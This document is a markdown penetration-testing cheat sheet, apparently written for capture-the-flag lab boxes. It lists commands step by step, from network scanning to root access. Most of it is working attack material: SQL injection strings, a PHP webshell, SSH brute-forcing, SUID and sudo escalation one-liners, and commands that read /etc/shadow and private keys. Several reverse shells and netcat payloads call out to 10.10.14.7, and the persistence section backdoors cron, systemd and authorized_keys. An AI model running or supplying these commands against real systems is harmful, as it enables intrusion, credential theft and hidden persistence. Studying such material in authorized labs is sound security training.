## 1\. Recon & Enumeration

### 1.1 Host Discovery

`nmap -sn 10.10.10.0/24       # Ping sweep fping -a -g 10.10.10.0/24    # Fast sweep`

_Why:_ Find live hosts in scope.

### 1.2 Port Scanning

`nmap -sC -sV -p- -T4 <IP>    # Full scan with default scripts nmap -A -T4 <IP>             # Aggressive scan (OS, versions, scripts)`

_Why:_ Identify open ports, versions, services.

### 1.3 Service Enumeration

-   **Web**:

    `whatweb http://<IP> nikto -h http://<IP> gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`

-   **SMB**:

    `enum4linux -a <IP> smbmap -H <IP> smbclient -L //<IP>/ -N`

-   **FTP**:

    `ftp <IP>`

-   **SSH**:

    `hydra -l root -P rockyou.txt ssh://<IP>`

_Why:_ Each service may leak info, creds, or be exploitable.

* * *

## 2\. Initial Foothold

### 2.1 Exploit Web Vulns

-   **SQLi**:

    `' OR 1=1-- admin'#`

-   **Command Injection**:

    `; id && whoami | nc -e /bin/sh 10.10.14.7 4444`

-   **File Upload (PHP shell)**:

    `<?php system($_GET['cmd']); ?>`

### 2.2 Exploit Weak Services

-   Anonymous FTP access → check for hidden files.
-   SMB shares with read/write access → drop webshell.

### 2.3 Known Exploits

-   `searchsploit <service version>`
-   Exploit DB / CVEs.

_Why:_ Foothold is about **any way** to execute commands or upload a shell.

* * *

## 3\. Shell & Stabilization

### 3.1 Upgrade Shell

`python3 -c 'import pty; pty.spawn("/bin/bash")' CTRL+Z stty raw -echo; fg export TERM=xterm`

_Why:_ Stable TTY = full terminal functionality.

### 3.2 Confirm User & System

`whoami id hostname uname -a lsb_release -a`

_Why:_ Establish your starting point.

* * *

## 4\. Enumeration (Post-Exploitation)

### 4.1 Users & Homes

`cat /etc/passwd ls -la /home`

_Why:_ Identify possible target users.

### 4.2 Sudo Rights

`sudo -l`

_Why:_ May allow root via misconfig.

### 4.3 SUID Binaries

`find / -perm -4000 -type f 2>/dev/null`

Examples of abusable SUID: `find`, `nmap`, `vim`, `bash`, `less`, `tar`.
_Why:_ Lets you run commands as root.

### 4.4 Capabilities

`getcap -r / 2>/dev/null`

Look for `cap_setuid`, `cap_sys_admin`.
_Why:_ Can grant root powers.

### 4.5 Cron Jobs

`ls -la /etc/cron*  crontab -l systemctl list-timers --all`

_Why:_ Writable scripts executed by root.

### 4.6 Writable Files & Folders

`find / -writable -type f 2>/dev/null | head`

_Why:_ Abuse writable scripts or configs.

### 4.7 Running Processes

`ps aux --forest netstat -tulpn ss -tulpn`

_Why:_ Hidden services or root-owned processes.

### 4.8 Configs & Credentials

`grep -Ri "password" /var/www 2>/dev/null grep -Ri "DB_PASS" /var/www 2>/dev/null`

_Why:_ Hardcoded creds = lateral movement or root escalation.

* * *

## 5\. Privilege Escalation

### 5.1 Sudo Exploits

`sudo -l # Example: user can run 'vim' as root sudo vim -c ':!/bin/sh'`

### 5.2 SUID Escalations

`/usr/bin/find . -exec /bin/sh -p \; -quit`

### 5.3 Capabilities

`python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`

### 5.4 Cronjob Hijack

Replace writable cron script with reverse shell:

`echo 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1' > /path/to/cron.sh`

### 5.5 Kernel Exploits

If old kernel:

`uname -r searchsploit linux kernel <version>`

* * *

## 6\. Loot & Post-Exploitation

### 6.1 Flags

`cat /home/*/user.txt cat /root/root.txt`

### 6.2 Hashes

`cat /etc/shadow`

### 6.3 SSH Keys

`find /home -name "id_rsa" 2>/dev/null`

### 6.4 Sensitive Files

`ls -la /var/backups grep -Ri "password" /etc /opt 2>/dev/null`

* * *

## 7\. Persistence 

-   **SSH Key Drop**

`echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys`

-   **Cronjob Reverse Shell**

`echo "* * * * * bash -i >& /dev/tcp/10.10.14.7/4444 0>&1" >> /etc/crontab`

-   **Systemd Service Hijack**

`echo '[Service] ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1" ' > /etc/systemd/system/fakesvc.service`

* * *

## 8\. Cleanup

-   Remove webshells, cron entries, backdoored users.
-   Good etiquette: leave box as you found it.
* * *

# Why Each Step Matters

-   **Recon:** Builds the map. You can’t attack what you don’t see.
-   **Foothold:** First way in — often unprivileged.
-   **Shell:** Lets you interact, but stabilize it to be useful.
-   **Enum:** Collects local info → escalates privilege.
-   **Privesc:** Moves you to root or higher users.
-   **Loot:** Prove ownership, capture flags.
-   **Persistence:** Optional but helps with re-entry.
-   **Cleanup:** Respect the lab, reset the game.
